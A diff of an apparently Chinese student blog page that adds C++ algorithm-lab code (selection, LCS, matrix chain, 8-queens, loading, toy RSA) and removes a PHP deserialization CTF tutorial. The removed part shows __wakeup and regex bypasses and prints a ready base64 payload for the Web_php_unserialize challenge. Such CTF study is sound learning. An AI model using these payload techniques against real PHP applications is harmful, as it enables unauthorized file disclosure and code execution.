+    if(n&lt;=0||k&gt;n||k&lt;=0)
+        return -1;
+    int j = Select(k,0,n-1,5);
+    x = l[j];
+        return 1;
+}
+
+int SortableList::Select(int k,int left,int right,int r)
+{
+    int n = right - left + 1;
+    if(n&lt;=r)
+    {
+        MergeSort(left,right);
+        return left + k - 1;
+    }
+    for (int i = 1; i &lt; n / r;i++)
+    {
+        MergeSort(left+(i-1)*r,left+i*r-1);
+        Swap(left+i-1,left+(i-1)*r+Ceil(r,2)-1);
+
+    }
+    int j = Select(Ceil(n/r,2),left,left+(n/2)-1,r);
+    Swap(left,j);
+    j = Partition(left,right);
+    if(k==j-left+1)
+        return j;
+    else if(k&lt;j-left+1)
+        return Select(k,left,j-1,r);
+        else
+            return Select(k-(j-left+1),j+1,right,r);
+
+}
+
+int main()
+{
+    int key;
+    int x, k;
+    SortableList list(30);
+    list.Input();
+    list.Output();
+    cout &lt;&lt; "\n\n请输入要寻找的第几小元素：\n";
+    cin &gt;&gt; k;
+    list.Select(x,k);
+    cout &lt;&lt; x &lt;&lt; endl;
+    //list.Output();
+}
+</code></pre>
+<h2 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h2><ul>
+<li>用动态规划法和备忘录方法实现求两序列的 最长公共子序列问题。 要求掌握动态规划法思想在实际中的应用，分析最长公共子序列的问题特征，选择算法策略并设计具体算法，编程实现两输入序列的比较，并输出它们的最长公共子序列。</li>
+<li>用动态规划法和备忘录方法求解矩阵相乘问题， 求得最优的计算次序以使得矩阵连乘总的数乘次数最少，并输出加括号的最优乘法算式。</li>
+</ul>
+<h3 id="1-最长公共子序列"><a href="#1-最长公共子序列" class="headerlink" title="1.最长公共子序列"></a>1.最长公共子序列</h3><pre><code class="line-numbers language-C++">#include &lt;iostream&gt;
+using namespace std;
+int const MaxLen = 50;
+class LCS
+{
+    public:
+        LCS(int nx,int ny,char *a,char *b);
+        ~LCS();
+        int LCSLength();
+        void CLCS();
+        void Output(int **a);
+        int** getc()  // 用来访问私有数据成员
+        {
+            return c;
+        };
+         int** gets()
+        {
+            return s;
+        };
+
+    private:
+        void CLCS(int i,int j);
+        int **c, **s;
+        int m, n;
+        char *x, *y;
+};
+
+LCS::LCS(int nx,int ny,char *a,char *b)
+{
+    m = nx;
+    n = ny;
+    x = a;
+    y = b;
+    c = new int *[m + 1];
+    s = new int *[m + 1];
+    for (int i = 0; i &lt;= m;i++)
+    {
+        c[i] = new int[n + 1];
+        s[i] = new int[n + 1];
+    }
+}
+
+LCS::~LCS()
+{
+    for (int i = 0; i &lt; m;i++)
+    {
+        delete c[i];
+        delete s[i];
+    }
+    delete c;
+    delete s;
+}
+
+int LCS::LCSLength()
+{
+    int i,j;
+    for ( i = 0; i &lt;= m;i++)
+        {
+            c[i][0] = 0;
+            s[i][0] = 0;
+        }
+    for (j = 1; j &lt;= n;j++)
+        {
+            c[0][j] = 0;
+            s[0][j] = 0;
+        }
+    for (i = 1; i &lt;= m;i++)
+        {
+            for (j = 1; j &lt;= n;j++)
+            {
+                // if(x[i]==y[i])   !!!!! 应该是y[j]
+                // {
+                //     c[i][j] = c[i-1][j-1]+ 1;   // 左上格值 + 1
+                //     s[i][j] = 1;
+                // }
+                if(x[i] == y[j])  //由c[i-1][j-1]得到c[i][j]
+                {
+                    c[i][j] = c[i - 1][j - 1] + 1;
+                    s[i][j] = 1;
+                }
+                else if(c[i-1][j] &gt;= c[i][j-1])    // 左格值 &gt; 上格值
+                {
+                    c[i][j] = c[i - 1][j];
+                    s[i][j] = 2;
+                }
+                else     //左格值 &lt; 上格值
+                {
+                    c[i][j] = c[i][j - 1];
+                    s[i][j] = 3;
+                }
+            }
+        }    
+return c[m][n];      // 返回最优解值
+}
+
+void LCS::CLCS(int i,int j)
+{
+    if(i==0||j==0)
+        return;
+    if(s[i][j]==1)
+    {
+        CLCS(i-1,j-1);
+        cout &lt;&lt; x[i];
+    }else if(s[i][j]==2)
+        CLCS(i-1,j);
+    else
+        CLCS(i, j - 1);
+}
+void LCS::CLCS()
+{
+    CLCS(m,n);
+}
+
+void LCS::Output(int **a)
+{
+    
+    int i, j;
+    printf("  ");
+    for (i = 0; i &lt;= n;i++)
+    {
+        printf("%4d",i);
+    }
+    printf("\n");
+    for (i = 0; i &lt;= m;i++)
+    {
+        printf("%2d",i);
+        for (j = 0; j &lt;= n;j++)
+           {
+               printf("%4d",a[i][j]);
+           }
+           printf("\n");
+    }
+   
+}
+
+int main()
+{
+    // int nx = 7, ny = 6;
+    // char *x = (char*)"0abcbdab";
+    // char *y = (char*)"0bdcaba";
+    
+    int nx, ny;
+    char *x = new char[MaxLen], *y = new char[MaxLen];
+    cout &lt;&lt; "Please input X:(Start with 0, like 0ab)" &lt;&lt; endl;
+    scanf("%s", x);
+    nx = strlen(x)-1;
+    cout &lt;&lt;endl&lt;&lt; "Please input Y:(Start with 0, like 0ab)" &lt;&lt; endl;
+    scanf("%s", y);
+    ny = strlen(y)-1;
+    LCS lcs(nx, ny, x, y);
+    cout &lt;&lt;endl&lt;&lt; "The LCSLength of X and Y is: " &lt;&lt; lcs.LCSLength() &lt;&lt; endl&lt;&lt;endl;
+    cout &lt;&lt; "The CLCS is: " ;
+    lcs.CLCS();
+    cout &lt;&lt; endl;
+    
+    cout &lt;&lt;endl&lt;&lt; "  c  =  " &lt;&lt; endl&lt;&lt;endl;
+    lcs.Output(lcs.getc());    // 输出c[i][j]
+    cout &lt;&lt;endl&lt;&lt;endl&lt;&lt; "  s  =  " &lt;&lt; endl&lt;&lt;endl;
+    lcs.Output(lcs.gets());   // 输出s[i][j]
+    delete []x;
+    delete []y;
+    return 0;
+}
+</code></pre>
+<h3 id="2-矩阵连乘"><a href="#2-矩阵连乘" class="headerlink" title="2.矩阵连乘"></a>2.矩阵连乘</h3><pre><code class="line-numbers language-C++">#include &lt;iostream&gt;
+#include &lt;iomanip&gt;  //输出格式头文件
+using namespace std;
+int const MaxLen = 50;
+class MatrixChain
+{
+    public:
+        MatrixChain(int mSize,int *q);
+        int MChain();
+        int LookupChain();
+        void Traceback();
+        void Output();
+
+    private:
+        void Traceback(int i,int j);
+        int LookupChain(int i,int j);
+        int *p, **m, **s, n;
+};
+
+MatrixChain::MatrixChain(int mSize, int *q)
+{  n=mSize;
+   m=new int*[n];   s=new int*[n];   p=new int[n+1];
+   for(int i=0; i&lt;n; i++)
+   {  m[i]=new int [n];   m[i][i]=0;
+      s[i]=new int [n];   s[i][i]=0;
+         p[i]=q[i];
+   }
+   p[n]=q[n];
+}
+
+int MatrixChain::MChain()
+{  //求A[0:n-1]的最优解值
+   //for (int i=0;i&lt;n; i++) m[i][i]=0;  //由于构造函数中有了m[i][i]=0的语句，这条可以删除，且备忘录方法输出的s数组对角线就是0，否则不正确。
+   for (int r=2; r&lt;=n; r++)
+     for (int i=0; i&lt;=n-r; i++) 
+                    {   int j=i+r-1;
+           m[i][j]=m[i+1][j]+p[i]*p[i+1]*p[j+1];  //m[i][j] 的初值
+            s[i][j]=i;
+            for (int k=i+1;    k&lt;j; k++) 
+                                {  int t=m[i][k]+m[k+1][j]+p[i]*p[k+1]*p[j+1];
+                 if (t&lt;m[i][j]) 
+                                            {  m[i][j]=t;   s[i][j]=k;
+                                            }
+                                }
+                    }
+      return m[0][n-1];
+}
+
+void MatrixChain::Traceback(int i,int j)
+{
+    if(i==j)
+    {
+        cout &lt;&lt; 'A' &lt;&lt; i;
+        return;
+    }
+    if(i&lt;s[i][j])
+        cout &lt;&lt; '(';
+    Traceback(i,s[i][j]);
+    if(i&lt;s[i][j])
+        cout &lt;&lt; ')';
+    if(s[i][j]+1&lt;j)
+        cout &lt;&lt; '(';
+    Traceback(s[i][j]+1,j);
+    if(s[i][j]+1&lt;j)
+        cout &lt;&lt; ')';
+
+}
+
+void MatrixChain::Traceback()
+{
+    cout &lt;&lt; '(';
+    Traceback(0,n-1);
+    cout &lt;&lt; ')';
+    cout &lt;&lt; endl;
+}
+
+int MatrixChain::LookupChain(int i, int j)
+{   if (m[i][j]&gt;0) return m[i][j];                  //子问题已经求解，直接引用
+      if(i==j) return 0;                                      //单一矩阵无须计算
+      int u=LookupChain(i+1, j)+p[i]*p[i+1]*p[j+1]; //按式（7-9）求最小值
+    s[i][j]=i;
+    for (int k=i+1; k&lt;j; k++) 
+            {  int t=LookupChain(i, k)+LookupChain(k+1, j)+p[i]*p[k+1]*p[j+1];
+         if (t&lt;u) 
+                        {  u=t;   s[i][j]=k;
+                        }
+            }
+    m[i][j]=u; return u;                           //保存并返回子最优解值
+}
+
+int MatrixChain::LookupChain()
+{  
+    return LookupChain(0, n-1);     //返回A[0:n-1]的最优解值
+}
+
+void MatrixChain::Output()
+{  int i,j;
+  
+   cout&lt;&lt;"  m="&lt;&lt;endl;
+   cout&lt;&lt;"  ";
+   for(j=0; j&lt;n; j++)
+                  if(j&lt;2) cout&lt;&lt;setw(4)&lt;&lt;j;
+                        else cout&lt;&lt;setw(6)&lt;&lt;j;
+   cout&lt;&lt;endl;
+
+   for(i=0; i&lt;n; i++)
+   {  cout&lt;&lt;"  "&lt;&lt;i&lt;&lt;" ";
+      for(j=0; j&lt;n; j++)
+                        {  if(i&lt;j) cout&lt;&lt;setw(6)&lt;&lt;m[i][j];  //setw(6), 指定输出域宽为6
+         else if(i==j) cout&lt;&lt;setw(2)&lt;&lt;m[i][j];
+            else cout&lt;&lt;setw(6)&lt;&lt;" ";
+                        }
+         cout&lt;&lt;endl;
+   }
+
+   cout&lt;&lt;"  s="&lt;&lt;endl;
+   cout&lt;&lt;"    ";
+   for(j=0; j&lt;n; j++) cout&lt;&lt;j&lt;&lt;" ";
+   cout&lt;&lt;endl;
+   for(i=0; i&lt;n; i++)
+   {  cout&lt;&lt;"  "&lt;&lt;i&lt;&lt;" ";
+      for(j=0; j&lt;n; j++)
+      {  if(i&lt;=j) cout&lt;&lt;s[i][j]&lt;&lt;" ";
+         else cout&lt;&lt;"  ";
+      }
+      cout&lt;&lt;endl;
+   }
+}
+
+int main()
+{ 
+//   int nn=6,k,k2;
+//   int pp[7]={30,35,15,5,10,20,25};
+int pp[MaxLen];
+int nn,i,k, k2;
+cout &lt;&lt; "  请输入连乘矩阵的个数" &lt;&lt; endl;
+scanf("%d", &amp;nn);
+cout &lt;&lt; "  请输入连乘矩阵的"&lt;&lt;nn+1&lt;&lt;"个维数(以空格隔开)"&lt;&lt; endl;
+for (i = 1; i &lt;= nn+1;i++)
+    {
+        scanf("%d", &amp;pp[i-1]);
+    }
+MatrixChain mm(nn, pp);
+k = mm.MChain();
+cout &lt;&lt; "  最少数乘次数k=" &lt;&lt; k &lt;&lt; endl; //最少数乘次数k=15125
+mm.Traceback();                          //矩阵连乘次序:(((A0(A1A2))((A3A4)A5))
+cout &lt;&lt; endl;
+mm.Output();
+k2 = mm.LookupChain();
+cout &lt;&lt;endl&lt;&lt; "采用备忘录方法：" &lt;&lt; endl;
+cout &lt;&lt; "  最少数乘次数k2=" &lt;&lt; k2 &lt;&lt; endl; //最少数乘次数k=15125
+mm.Traceback();                            //矩阵连乘次序:(((A0(A1A2))((A3A4)A5))
+cout &lt;&lt; endl;
+mm.Output();
+
+  
+}
+</code></pre>
+<h2 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h2><ul>
+<li><p>用回溯法求解 8- 皇后问题，使放置在 8*8 棋盘上的 8 个皇后彼此不受攻击，即：任何两个皇后都不在同一行、同一列或同一斜线上。请输出 8-皇后问题的所有可行解。</p>
+</li>
+<li><p>用回溯法编写一个递归程序解决如下装载问题： 有 n 个集装箱要装上 2 艘载重分别为 c1和 c2的轮船，其中集装箱 i 的重量为 wi（1≤ i ≤ n） ，且                                ,问是否有一个合理的装载方案可以将这 n 个集装箱装上这 2 艘轮船？如果有，请给出装载方案</p>
+<p>提示 ：参考 子集和数问题的求解方法。 </p>
+<p>举例 ： 当 n=3， c1=c2=50， 且 w=[10,40,40]时， 可以将集装箱 1 和 2 装到第一艘轮船上，集装箱 3 装到第二艘轮船上；如果 w=[20,40,40]时，无法将这 3 个集装箱都装上轮船。</p>
+</li>
+</ul>
+<h3 id="1-8皇后问题"><a href="#1-8皇后问题" class="headerlink" title="1.8皇后问题"></a>1.8皇后问题</h3><pre><code class="line-numbers language-C++">#include &lt;iostream&gt;
+#include &lt;cstdio&gt;
+#include &lt;cstdlib&gt;
+#include &lt;cmath&gt;
+#define N 8        // 8 皇后
+using namespace std;
+int count = 0,count2=0;
+
+//判定两个皇后是否在同一列或在同一斜线上
+bool Place(int k, int i, int *x)
+{
+   for(int j = 0; j &lt; k; j++)
+   if((x[j] == i) || (abs(x[j] - i) == abs(j - k))) 
+       return false;
+   return true;
+}
+
+//递归函数（求解n皇后问题）
+void NQueens(int k, int n, int *x) 
+{
+    for(int i = 0; i &lt; n; i++)  //显式约束的第一种观点，x[k] = 0,1,···,n-1
+    {
+        if(Place(k, i, x))  //约束函数
+        {
+            x[k] = i;
+            if(k == n - 1)    
+            {
+                for(i = 0; i &lt; n; i++) 
+                  cout &lt;&lt; x[i] &lt;&lt; " ";  //输出一个可行解
+                cout &lt;&lt; endl;
+                count ++;
+            }
+            else
+            {
+               NQueens(k + 1, n, x);  //深度优先进入下一层
+            }
+       }
+    }
+}
+
+void NQueens(int n, int *x)
+{
+    NQueens(0, n, x);
+}
+
+//求非对称解
+void NQueens2(int k, int n, int *x) 
+{
+    static int temp=n;        //求非对称的解
+    if(k==0)
+        n = int(temp / 2);
+    else
+        n = temp;
+    for(int i = 0; i &lt; n; i++)  //显式约束的第一种观点，x[k] = 0,1,···,n-1
+    {
+        if(Place(k, i, x))  //约束函数
+        {
+            x[k] = i;
+            if(k == n - 1)    
+            {
+                for(i = 0; i &lt; n; i++) 
+                  cout &lt;&lt; x[i] &lt;&lt; " ";  //输出一个可行解
+                cout &lt;&lt; endl;
+                count2 ++;
+            }
+            else
+            {
+               NQueens2(k + 1, n, x);  //深度优先进入下一层
+            }
+       }
+    }
+}
+
+void NQueens2(int n, int *x)
+{
+    NQueens2(0, n, x);
+}
+
+int main()
+{
+    int queens[N];  //8皇后
+    // int count = 0,count2=0;
+    for(int i = 0; i &lt; N; i++) 
+        queens[i] = -1;
+    NQueens(N, queens);
+    cout &lt;&lt;endl&lt;&lt; "可行解共有: " &lt;&lt; count &lt;&lt;" 组"&lt;&lt; endl;
+    cout &lt;&lt; endl&lt;&lt; " 仅输出非对称解 : " &lt;&lt; endl;
+    NQueens2(N, queens);
+    cout &lt;&lt;endl&lt;&lt; "非对称可行解共有: " &lt;&lt; count2 &lt;&lt;" 组"&lt;&lt; endl;
+    getchar();
+    return 0;
+}
+</code></pre>
+<h3 id="2-装载问题"><a href="#2-装载问题" class="headerlink" title="2.装载问题"></a>2.装载问题</h3><pre><code class="line-numbers language-C++">#include &lt;iostream&gt;
+
+using namespace std;
+
+template &lt;class T&gt; 
+class Loading  
+{ 
+private: 
+  int  n,  // 集装箱数 
+   x[100],   // 当前解 
+   bestx[100]; // 当前 第一艘 船的最优解 
+T  c1, // 第一艘轮船的核定载重量 
+   c2, // 第二艘轮船的核定载重量 
+   w[100], // 集装箱重量数组 
+   total,  // 所有集装箱重量之和 
+   cw,   // 当前 第一艘船的 载重量 
+   bestw, // 当前 第一艘 船的最优载重量 
+   r;   // 剩余集装箱总重量 
+public: 
+  Loading()   // 构造函数 
+  {
+    cout&lt;&lt;"请输入集装箱的数量："&lt;&lt;endl;
+    cin&gt;&gt;n;
+    cout&lt;&lt;"请输入轮船1、2的载重量："&lt;&lt;endl;
+    cin&gt;&gt;c1&gt;&gt;c2;
+    cout&lt;&lt;"请输入每个集装箱的重量："&lt;&lt;endl;
+    for(int i=1;i&lt;=n;i++)
+    {
+        cin&gt;&gt;w[i];
+    }
+
+    r=0;
+    cw=0;
+    bestw=0;
+    for(int i=1;i&lt;=n;i++)
+    {
+        r=r+w[i];
+    }
+  }
+
+      ~Loading() // 析构函数
+      {
+      }
+    void Backtrack(int i); // 找到最接近第一艘轮船载重c1 的最佳装载方案，
+                                // 最优载重值bestw ，最优解数组bestx 。
+    void Show();          // 输出整个装载方案 
+}; 
+ 
+template &lt;class T&gt; 
+void Loading&lt;T&gt;::Backtrack(int i) 
+{  
+ if(i&gt;n) //判断是否达到叶子节点
+    { //到达叶子节点
+        if(cw&gt;bestw)
+        {
+            for(int j=1;j&lt;=n;j++)
+            {
+                bestx[j]=x[j];   //把当前解赋给最优解
+            }
+            bestw=cw;    //把当前载重量赋给当前最优载重量
         }
     }
-    $ctfer=new Ctf();
-    $ctfer-&gt;flag='flag{abedyui}';
-    $ctfer-&gt;name='Sch0lar';
-    $ctfer-&gt;age='18'
-    echo serialize($ctfer);
-?&gt;
-</code></pre>
-<p>运行结果：<strong>O:3:”Ctf”:2:{s:4:”flag”;s:13:”flag{abedyui}”;s:3:”age”;s:2:”18”;}</strong></p>
-<p>（注意一下，这边对php的版本有要求，此处我用的是php 5.2.17nts）</p>
-<h5 id="2-反序列化函数-unserialize"><a href="#2-反序列化函数-unserialize" class="headerlink" title="2.反序列化函数 unserialize()"></a>2.反序列化函数 unserialize()</h5><pre><code class="line-numbers language-php">&lt;?php
-    class Ctf{
-        public $flag='flag{****}';
-        public $name='cxk';
-        public $age='10';
-        
-    }
-    $ctfer=new Ctf();
-    $ctfer-&gt;flag='flag{abedyui}';
-    $ctfer-&gt;name='Sch0lar';
-    $ctfer-&gt;age='18';
-    $a = serialize($ctfer);    //O:3:"Ctf":2:{s:4:"flag";s:13:"flag{abedyui}";s:3:"age";s:2:"18";}
-    var_dump(unserialize($a));  //输出反序列化的结果
-?&gt;
-</code></pre>
-<p>运行结果：<strong>D:\phpstudy_pro\WWW\sleep.php:13: class Ctf#2 (3) { public $flag =&gt; string(13) “flag{abedyui}” public $name =&gt; string(7) “Sch0lar” public $age =&gt; string(2) “18” }</strong></p>
-<pre><code>D:\phpstudy_pro\WWW\sleep.php:13:
-class Ctf#2 (3) {
-  public $flag =&gt;
-  string(13) "flag{abedyui}"
-  public $name =&gt;
-  string(7) "Sch0lar"
-  public $age =&gt;
-  string(2) "18"
-}
-</code></pre>
-<p>注：unserialize() 执行时会检查是否存在一个 wakeup() 方法。 如果存在，则会先调用 wakeup方法。而涉及到__wakeup()函数，经常要用到的就是<strong>当序列化字符串中表示对象属性个数的数字值大于真实类中属性的个数时就会跳过wakeup()函数的执行。</strong></p>
-<blockquote>
-<p>__sleep()函数是在serialize(序函数列化一个对象前被调用，用来指定要序列化的属性</p>
-<p>__wakeup()函数则是在unserialize()反序列化一个字符串前被调用</p>
-</blockquote>
-<p>关于__wakeup()的实例：</p>
-<h6 id="1-攻防世界-web高手进阶区-unserialize3-wakeup-魔术方法"><a href="#1-攻防世界-web高手进阶区-unserialize3-wakeup-魔术方法" class="headerlink" title="1.攻防世界 web高手进阶区 unserialize3 (__wakeup()魔术方法)"></a>1.攻防世界 web高手进阶区 unserialize3 (<strong>__wakeup()魔术方法</strong>)</h6><p><a href="https://blog.csdn.net/LTtiandd/article/details/99591998">攻防世界unserialize3题解</a></p>
-<blockquote>
-<p>__wakeup() 将在被序列化后立即被调用 </p>
-<p><strong>__wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，会导致反序列化失败同时不会执行__wakeup()函数</strong></p>
-</blockquote>
-<pre><code class="line-numbers language-php">&lt;?php
-class Ab4ndon{
-        var $test = '123';
-}
 
-$a = new Ab4ndon();    //这里就是创建了一个新的对象
+    r=r-w[i];  //剩余集装箱的总重量
+    if(cw+w[i]&lt;=c1) //判断该集装箱到底放不放
+    {
+        x[i]=1;
+        cw=cw+w[i];
+        Backtrack(i+1);
+        //当节点i的子树延伸结束时要返回i节点
+        x[i]=0;
+        cw=cw-w[i];
 
-$a_ser = serialize($a);   //将这个对象进行字符串封装，就是对其进行序列化
+    }
+    if(cw+r&gt;bestw) //判断先不放该集装箱后是否还有可行解
+    {
+        x[i]=0;
+        Backtrack(i+1);
+    }
+    r=r+w[i];
 
-//print_r($a_ser);
-$a_unser = unserialize($a_ser);//进行反序列化
-
-print_r($a_unser);
-?&gt;
-</code></pre>
-<p>代码：</p>
-<pre><code class="line-numbers language-php">&lt;?php
-class xctf{
-    public $flag = '111';
-    public function __wakeup(){
-    exit('bad requests');
-    }
-}//这边注意一下方括号要对应，一开始少了这个方括号一直报错
-    $a = new xctf();
-    $a_ser = serialize($a);   //将这个对象进行字符串封装，就是对其进行序列化
-
-print_r($a_ser);  //输出序列化后的内容
-?&gt;
-</code></pre>
-<p>序列化结果：</p>
-<p><code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code></p>
-<p>利用__wakeup()的漏洞，构造payload为：**?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}**</p>
-<h5 id="3-访问控制修饰符"><a href="#3-访问控制修饰符" class="headerlink" title="3.访问控制修饰符"></a>3.访问控制修饰符</h5><pre><code>public(公有) 
-protected(受保护)     // %00*%00属性名
-private(私有的)       // %00类名%00属性名
-</code></pre>
-<p>在本地写个php测试一下:</p>
-<pre><code class="line-numbers language-php">&lt;?php
-    class Ctf{
-        public $name='Ab4ndon';
-        protected $age='20';
-        private $flag='fl4g';
-    }
-    $ctfer=new Ctf();     //实例化一个对象
-    echo serialize($ctfer);
-?&gt;
-</code></pre>
-<p>输出结果：*<em>O:3:”Ctf”:3:{s:4:”name”;s:7:”Ab4ndon”;s:6:”<em>age”;s:2:”20”;s:9:”Ctfflag”;s:4:”fl4g”;}</em></em></p>
-<blockquote>
-<p>可以看到，protected 属性被序列化后age属性名的长度变成了6,为什么呢？因为age前还有**%00*%00**</p>
-<p>同样地，private 属性被序列化后flag属性名的长度也不是flag的原长，因为flag前面还有**%00Ctf%00**</p>
-</blockquote>
-<p>下面介绍一个考察__wakeup()和访问控制修饰符的题：</p>
-<h6 id="1-攻防世界-web高手进阶区-Web-php-unserialize"><a href="#1-攻防世界-web高手进阶区-Web-php-unserialize" class="headerlink" title="1.攻防世界 web高手进阶区 Web_php_unserialize"></a>1.攻防世界 web高手进阶区 Web_php_unserialize</h6><p>源码：</p>
-<pre><code class="line-numbers language-php">&lt;?php 
-class Demo { 
-    private $file = 'index.php';
-    public function __construct($file) {     //执行 __construct 方法，将传入的 $file 赋值给本地的私有方法 $file
-        $this-&gt;file = $file; 
-    }
-    function __destruct() { 
-        echo @highlight_file($this-&gt;file, true);   //销毁时执行 __destruct 方法，高亮本地变量 file 文件的代码
-    }
-    function __wakeup() { 
-        if ($this-&gt;file != 'index.php') {        //当反序列化构造这个类时执行 __wakeup 方法，会将本地变量 file                                                     重新设置为 index.php
-            //the secret is in the fl4g.php
-            $this-&gt;file = 'index.php'; 
-        } 
-    } 
-}
-if (isset($_GET['var'])) { 
-    $var = base64_decode($_GET['var']);         //base64编码传入的var参数
-    if (preg_match('/[oc]:\d+:/i', $var)) {     //正则匹配 o:数字：或者 c:数字：，不区分大小写
-        die('stop hacking!'); 
-    } else {
-        @unserialize($var);                     //反序列化
-    } 
-} else { 
-    highlight_file("index.php"); 
 } 
-?&gt;
-</code></pre>
-<p>思路大致为：</p>
-<p>构造Demo类，传入$file=fl4g.php(传入的$file赋值给本地私有方法$file，然后__destruct()函数在对象销毁时执行，高亮本地变量file的代码，故我们将file赋值为我们想看的fl4g.php),然后将其序列化</p>
-<pre><code class="line-numbers language-php">&lt;?php 
-class Demo { 
-    private $file = 'fl4g.php';
+ 
+template &lt;class T&gt; 
+void Loading&lt;T&gt;::Show() 
+{
+    int c2w=0;
+    for(int i=1;i&lt;=n;i++)
+    {
+        if(bestx[i]==0)
+        {
+            c2w=c2w+w[i];
+        }
+    }
+    if(c2w&gt;c2)
+        cout&lt;&lt;endl&lt;&lt;"装载失败！无法装下所有的集装箱！"&lt;&lt;endl;
+    else
+    {
+        cout &lt;&lt; endl&lt;&lt;"成功装载！" &lt;&lt; endl;
+        cout&lt;&lt;"第一艘船所装的集装箱为："&lt;&lt;endl;
+        for(int i=1;i&lt;=n;i++)
+        {
+            if(bestx[i]==1)
+                cout&lt;&lt;i&lt;&lt;" ";
+        }
+        cout&lt;&lt;endl;
+        cout&lt;&lt;"第二艘船所装的集装箱为："&lt;&lt;endl;
+        for(int i=1;i&lt;=n;i++)
+        {
+            if(bestx[i]!=1)
+                cout&lt;&lt;i&lt;&lt;" ";
+        }
+
+    }
+
+} 
+ 
+int  main() 
+{ 
+  Loading&lt;int&gt; load;
+  load.~Loading();
+  load.Backtrack(1); 
+  load.Show(); 
+//   system("pause");
+  return 0;
 }
-
-$a =new Demo($file);
-echo serialize($a);        //O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
-
 </code></pre>
-<p>将序列化结果中的属性个数改为2（绕过__wakeup()函数的执行），将o:4改为o:+4或者o:@4(绕过正则匹配)，Base64编码后get传参</p>
-<p>但是这样操作得不到flag，问题出在哪？</p>
-<p>$file是私有方法 private,前面提到private属性被序列化后属性名的形式为**%00类名%00属性名**,我们看到file本该是4个字符，序列化后确实10个字符。我尝试在Demo前后加%00再编码，失败，后来看别人的wp，才找到原因，<strong>因为复制粘贴时破坏了 “ %00 “ 这个特殊字符。 将序列化后的字符串直接存入文件不会破坏这个 “ %00 “ 特殊字符。</strong></p>
-<pre><code class="line-numbers language-php">&lt;?php 
-class Demo { 
-    private $file = 'fl4g.php';
-}
-
-$c =new Demo($file);
-$a=serialize($c);        //O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
-
-$a = str_replace(':1:', ':2:', $a);        //绕过wakeup
-$a = str_replace('O:4', 'O:+4', $a);        //绕过正则匹配
-print_r($a);
-print_r("&lt;br&gt;");
-var_dump(base64_encode($a));        //base64编码
-//O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}&lt;br&gt;D:\phpstudy_pro\WWW\sleep.php:13:
-//string(68) "TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=="
-</code></pre>
-<p>所以构造payload:<strong>?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</strong></p>
-<blockquote>
-<p>注意学习这种直接写php去得到payload的方法，尤其是碰到private和protected时</p>
-<p>此处再贴一篇wp:<a href="https://moreant.github.io/post/60542.html">攻防世界 WEB Web_php_unserialize</a></p>
+<h2 id="实验四"><a href="#实验四" class="headerlink" title="实验四"></a>实验四</h2><h3 id="编程一个简单的RSA加、解密系统。"><a href="#编程一个简单的RSA加、解密系统。" class="headerlink" title="编程一个简单的RSA加、解密系统。"></a>编程一个简单的RSA加、解密系统。</h3><blockquote>
+<ul>
+<li><p>假设用户A选择两个素数p和q，计算得到n=pq和Φ(n)=(p-1)(q-1)。选择一个加密密钥e，它小于Φ(n)且与Φ(n)互素。计算解密密钥 d≡ e-1 mod Φ(n)。则用户A公布公开密钥{e,n}，自己拥有私有密钥{d,n}。</p>
+</li>
+<li><p>用户B使用用户 A 的公开密钥 e 和 n 对报文 M 进行加密，得到 C= Me mod n，并发送给用户 A。</p>
+</li>
+<li><p>用户A收到加密的报文后，使用自己的私有密钥 d 和 n 对加密报文 C 进行解密，恢复得到明文 M=Cd mod n。</p>
+</li>
+</ul>
 </blockquote>
-<h5 id="4-魔术方法"><a href="#4-魔术方法" class="headerlink" title="4.魔术方法"></a>4.魔术方法</h5><p><strong>php反序列化漏洞触发条件：</strong> unserialize函数的参数、变量可控，php文件中存在可利用的类，类中有魔术方法</p>
-<p>接下来介绍一些常见的魔术方法（wakeup()和sleep()函数在前面已经介绍过了，就不再详述）</p>
-<pre><code>__construct() 当对象创建（new）时会自动调用。但在 unserialize() 时是不会自动调用的。
+<h4 id="初始代码"><a href="#初始代码" class="headerlink" title="初始代码"></a>初始代码</h4><pre><code class="line-numbers language-c++">#include &lt;iostream&gt;
+using namespace std;
+int MOD;
 
-__destruct() 当一个对象销毁（反序列化）时被调用
+//由公开密钥e和n，求私有密钥d
+int ext_euclid(int a, int b, int &amp;x, int &amp;y) 
+{ 
+    if(b == 0)
+    {
+        x = 1;
+        y = 0;
+        return a;
+    }
+    int gcd = ext_euclid(b, a % b, x, y);
+    int t = x % MOD;
+    x = y % MOD;
+    y = ((t - a / b * x) % MOD + MOD) % MOD;
+    return gcd;
+}
 
-__toString() 当一个对象被当作一个字符串使用时被调用
+int main()
+{
+    int p, q, i, d;
+    cout &lt;&lt; "请输入一个质数 p (如 101) :";
+    cin &gt;&gt; p;
+    cout &lt;&lt; "请输入一个质数 q (如 113) :";
+    cin &gt;&gt; q;
+    int n = p * q;
+    cout&lt;&lt;"分组加密时，每个分组的大小 n 不能超过 p*q=";
+    cout &lt;&lt; n &lt;&lt; endl;
 
-__sleep() 在对象在被序列化之前立即运行
+    //求得φ(n)=(p-1)*(q-1)的值
+    MOD = (p - 1) * (q - 1);
+    cout &lt;&lt; "模φ(n)=(p-1)*(q-1)=";
+    cout &lt;&lt; MOD &lt;&lt; endl &lt;&lt; endl;
 
-__wakeup() 将在序列化之后立即被调用
+    //选取与φ(n)互质的公钥e
+    int e;
+    cout &lt;&lt; "输入与φ(n)互质的公钥 e (如 3533):";
+    cin &gt;&gt; e;
+
+    //由e和φ(n)生成私钥d
+    int x, y;
+    ext_euclid(e, MOD, d, y);
+    while(d &lt; 0) 
+        d += MOD;
+    cout &lt;&lt; "通过调用扩展欧几里德算法，求得密钥d为：" &lt;&lt; d &lt;&lt; endl;
+
+    //利用生成的公钥{e,n}对明文M进行加密
+    int M, C;
+    cout &lt;&lt; "现在公钥{e,n}、私钥{d,n}均已生成完毕。\n\n请输入需要传输的明文内容进行加密(如9726):";
+    cin &gt;&gt; M;
+    C = 1;
